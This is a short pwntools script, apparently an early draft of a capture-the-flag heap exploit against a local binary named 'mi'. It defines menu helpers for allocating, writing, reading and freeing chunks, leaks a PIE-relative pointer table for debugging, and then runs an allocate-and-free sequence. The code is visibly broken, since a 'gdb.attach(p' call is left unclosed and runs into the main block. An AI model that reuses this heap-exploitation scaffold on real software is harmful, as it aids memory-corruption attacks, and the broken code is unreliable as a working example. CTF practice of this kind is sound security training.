from pwn import *
from heaputils import *

def create(index,size):
	p.sendlineafter(">>","1")
	p.sendlineafter("Input number",str(index))
	p.sendlineafter("Input size",str(size))

def delete(index):
	p.sendlineafter(">>","4")
	p.sendlineafter("Input number",str(index))

def read(index):
	p.sendlineafter(">>","3")
	p.sendlineafter("Input number",str(index))

def write(index,content):
	p.sendlineafter(">>","2")
	p.sendlineafter("Input number",str(index))
	p.sendafter("Input value",content)

def debug():
	array = get_PIE(p)+0x202040
	data = p.leak(array,0x80)
	for i in range(0x8):
		length = u64(data[i*16:i*16+8])
		ptr = u64(data[i*16+8:i*16+16])
		print "[%d] ptr: 0x%x, length 0x%x"%(i,ptr,length)
	gdb.attach(p     
if __name__ == "__main__":
	p = process("./mi",env={"LD_LIBRARY_PATH":"."})
	create(0,0x100)
	create(1,0xf000000)
	delete(0)
	debug()
	p.interactive()